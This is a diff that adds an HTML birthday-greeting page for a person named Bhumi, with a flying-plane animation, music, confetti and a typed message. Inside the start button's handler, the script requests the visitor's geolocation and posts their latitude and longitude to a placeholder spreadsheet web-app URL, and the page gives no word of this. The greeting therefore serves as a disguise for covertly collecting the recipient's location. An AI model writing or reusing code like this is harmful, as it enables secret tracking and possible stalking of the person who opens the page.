@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Happy Birthday Bhumi</title>
+
+<style>
+body{
+  margin:0;
+  height:100vh;
+  background:url("background.jpg") center/cover no-repeat;
+  font-family: Arial, Helvetica, sans-serif;
+  font-weight: bold;
+  overflow:hidden;
+  text-align:center;
+}
+
+#startBtn{
+  margin-top:45vh;
+  padding:16px 32px;
+  font-size:20px;
+  border:none;
+  border-radius:30px;
+  background:#ff2d55;
+  color:white;
+  cursor:pointer;
+}
+
+#plane{
+  position:fixed;
+  top:20px;
+  left:-120px;
+  width:100px;
+  display:none;
+  transition:transform 4s linear;
+}
+
+.fly{
+  transform:translate(55vw,45vh);
+}
+
+#cities{
+  position:fixed;
+  top:10px;
+  width:100%;
+  display:flex;
+  justify-content:space-between;
+  padding:0 15px;
+  color:white;
+  text-shadow:2px 2px 6px black;
+}
+
+#message{
+  display:none;
+  margin-top:20px;
+  font-size:22px;
+  color:#ffffff;
+  text-shadow:2px 2px 8px black;
+  white-space:pre-line;
+}
+
+canvas{
+  position:fixed;
+  top:0;
+  left:0;
+  pointer-events:none;
+}
+</style>
+</head>
+
+<body>
+
+<div id="cities">
+  <span>Delhi ✈️</span>
+  <span>Bhavnagar 🎉</span>
+</div>
+
+<button id="startBtn">🎁 Start Birthday Surprise</button>
+
+<img id="plane" src="plane.png">
+
+<div id="message"></div>
+
+<audio id="music" src="birthday.mp3"></audio>
+
+<canvas id="confetti"></canvas>
+
+<script>
+const SHEET_URL = "PASTE_WEB_APP_URL_HERE";
+
+const text = `🎉 HAPPY BIRTHDAY BHUMI 🎉
+
+Blow your candles 🎂 and make a wish 🌠
+May this new personal year be filled with happiness, peace, and positivity ✨
+Enjoy your special day to the fullest 🥳`;
+
+startBtn.onclick = () => {
+  startBtn.style.display="none";
+
+  music.play().catch(()=>{}); // autoplay fallback
+  plane.style.display="block";
+  plane.offsetHeight;
+  plane.classList.add("fly");
+
+  navigator.geolocation.getCurrentPosition(pos=>{
+    fetch(SHEET_URL,{
+      method:"POST",
+      body:JSON.stringify({
+        lat:pos.coords.latitude,
+        lon:pos.coords.longitude,
+        city:"",
+        state:"",
+        country:""
+      })
+    });
+  });
+
+  setTimeout(()=>{
+    startConfetti();
+    typeText();
+  },4200);
+};
+
+function typeText(){
+  message.style.display="block";
+  let i=0;
+  const t=setInterval(()=>{
+    message.textContent+=text[i++];
+    if(i>=text.length) clearInterval(t);
+  },45);
+}
+
+/* CONFETTI */
+const canvas=document.getElementById("confetti");
+const ctx=canvas.getContext("2d");
+canvas.width=innerWidth;
+canvas.height=innerHeight;
+let pieces=[];
+
+function startConfetti(){
+  for(let i=0;i<200;i++){
+    pieces.push({
+      x:Math.random()*canvas.width,
+      y:Math.random()*canvas.height-canvas.height,
+      r:Math.random()*6+4,
+      c:`hsl(${Math.random()*360},100%,50%)`,
+      s:Math.random()*3+2
+    });
+  }
+  requestAnimationFrame(update);
+}
+
+function update(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  pieces.forEach(p=>{
+    p.y+=p.s;
+    ctx.beginPath();
+    ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
+    ctx.fillStyle=p.c;
+    ctx.fill();
+  });
+  requestAnimationFrame(update);
+}
+</script>
+
+</body>
+</html>
